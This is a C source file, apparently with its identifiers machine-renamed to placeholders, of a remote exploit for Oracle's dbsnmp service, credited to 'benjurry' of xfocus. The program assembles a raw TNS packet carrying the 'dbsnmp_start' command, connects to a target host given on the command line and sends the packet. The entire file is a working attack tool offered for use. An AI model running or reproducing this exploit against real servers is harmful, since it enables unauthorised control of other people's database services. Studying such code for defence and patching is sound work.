
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_family; int sin_port; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int server ;
typedef int head ;
typedef int cmd2 ;
typedef int cmd1 ;
typedef int WSADATA ;


 int VAR_0 ;
 int FUNC_0 () ;
 int FUNC_1 (int,int) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_2 (int) ;
 int FUNC_3 () ;
 int FUNC_4 (int ,int *) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int) ;
 struct hostent* FUNC_8 (char*) ;
 int FUNC_9 (int ) ;
 int FUNC_10 (char*,char*,int) ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 (int,char*,int,int ) ;
 int FUNC_13 (int ,int ,int ) ;

int FUNC_14(int VAR_3, char *VAR_4[])
{


  char VAR_5[]="(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=dbsnmp_start)";
  char VAR_6[]="(VERSION=1)))";
  char VAR_7[]="\x00\x59\x00\x00\x01\x00\x00\x00\x01\x36"
   "\x01\x2c\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01"
   "\x00\x1f\x00\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
   "\x00\x00\x00\x00\x00\x00\x34\xe6\x00\x00\x00\x01\x00\x00"
   "\x00\x00\x00\x00\x00\x00";

  char VAR_8[200];
  int VAR_9;
 int VAR_10;
 int VAR_11;
 int VAR_12;

 WSADATA VAR_13;
 struct hostent *VAR_14;
 struct sockaddr_in VAR_15;

 FUNC_11("Oracle dbsnmp command Remote Vulnerability discoveried by Benjurry\n");
 FUNC_11("Code by benjurry,benjurry@263.net\n");
 FUNC_11("www.xfocus.org  www.benjurry.org\n");
 if(VAR_3<2)
 {
  FUNC_11("useage:%s target\n",VAR_4[0]);
FUNC_7(1);
 }
  VAR_12=sizeof(VAR_7);

 VAR_10=58+sizeof(VAR_5)+sizeof(VAR_6)-2;


 VAR_11=sizeof(VAR_5)+sizeof(VAR_6)-2;

 FUNC_10(VAR_8,VAR_7,sizeof(VAR_7)-1);
 FUNC_10(VAR_8+sizeof(VAR_7)-1,VAR_5,sizeof(VAR_5)-1);
 FUNC_10(VAR_8+sizeof(VAR_7)-1+sizeof(VAR_5)-1,VAR_6,sizeof(VAR_6));



 VAR_8[0]=VAR_10>> 8;
 VAR_8[1]=VAR_10 & 0xff;
 VAR_8[24]=VAR_11>>8;
 VAR_8[25]=VAR_11& 0xff;





if((VAR_12=FUNC_4(FUNC_1(1,1), &VAR_13)) != 0)
        {
                FUNC_11("WSAStartup failed.\n");
    VAR_12=FUNC_0();
                FUNC_3();
                FUNC_7(1);
        }
if((VAR_14 = FUNC_8(VAR_4[1]))==0)
{
                FUNC_11("Unable to resolve host %s\n",VAR_4[1]);
                FUNC_7(1);
        }
VAR_15.sin_port = FUNC_9(VAR_1);
VAR_15.sin_family=VAR_0;
VAR_15.sin_addr=*((struct in_addr *)VAR_14->h_addr);
   if((VAR_9 = FUNC_13(VAR_0, VAR_2, 0)) == -1)
        {
                FUNC_11("Unable to set up socket\n");
                FUNC_7(1);
        }

if((FUNC_6(VAR_9, (struct sockaddr *) &VAR_15, sizeof(VAR_15))) == -1)
        {
                FUNC_11("Unable to connect\n");
                FUNC_7(1);
        }
        else
                FUNC_11("Connected.\n");


  if(FUNC_12(VAR_9, VAR_8, VAR_10, 0) == -1)
        {
                FUNC_11("Unable to send\n");
                FUNC_7(1);
        }
        else
        {
                FUNC_11("code sented...\n");

        }
FUNC_2(1000);
FUNC_5(VAR_9);
return 0;


}
